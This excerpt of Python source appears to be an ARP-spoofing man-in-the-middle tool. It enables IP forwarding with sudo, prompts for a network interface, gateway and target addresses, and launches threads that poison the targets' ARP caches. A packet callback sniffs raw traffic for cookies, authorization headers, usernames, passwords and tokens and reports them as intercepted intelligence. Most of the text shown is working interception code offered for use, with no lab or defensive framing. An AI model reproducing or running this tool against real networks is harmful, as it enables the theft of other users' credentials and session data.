...
class MITMEngine:
    ...
    def toggle_forwarding(self, state=True):
        ...
        try:
            if sys.platform == 'darwin':
                os.system(f"sudo sysctl -w net.inet.ip.forwarding={val} > /dev/null")
            elif sys.platform.startswith('linux'):
                os.system(f"echo {val} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
            console.print(f"[*] IP Forwarding {'enabled' if state else 'disabled'}.")
        except Exception as e:
            console.print(f"[yellow][!] Forwarding config failed: {e}[/yellow]")
    ...
    def packet_callback(self, packet):
        ...
        if packet.haslayer(Raw) and packet.haslayer(IP):
            try:
                ...
                keywords = ["Cookie:", "Authorization:", "user=", "pass=", "token="]
                if any(key in load for key in keywords):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    console.print(f"[bold red][!] INTEL INTERCEPTED ({src_ip} -> {dst_ip}):[/bold red] Potential Sensitive Data")
    ...
    def run(self):
        ...
        if_table.add_column("Index", justify="center")
        if_table.add_column("Interface Name")
        for idx, name in enumerate(ifaces):
            if_table.add_row(str(idx), name)
        console.print(if_table)

        self.interface = console.input("[bold yellow]Select Interface (e.g. eth0): [/bold yellow]").strip()
        if self.interface not in ifaces:
            return console.print("[red]Invalid Interface.[/red]")

        self.gateway_ip = console.input("[bold yellow]Gateway (Router) IP: [/bold yellow]")
        target_input = console.input("[bold yellow]Target IP or Range (e.g. 192.168.1.5): [/bold yellow]")
        ...
        console.print(f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")

        for ip, mac in self.targets:
            t = threading.Thread(target=self.poison, args=(ip, mac, gw_mac), daemon=True)
            t.start()
            self.threads.append(t)

        console.print("[bold red][!] Interception Active. Press Ctrl+C to stop and restore network.[/bold red]")
        ...
        try:
            ...
            console.print("[bold green][+] Network Restored Successfully.[/bold green]")
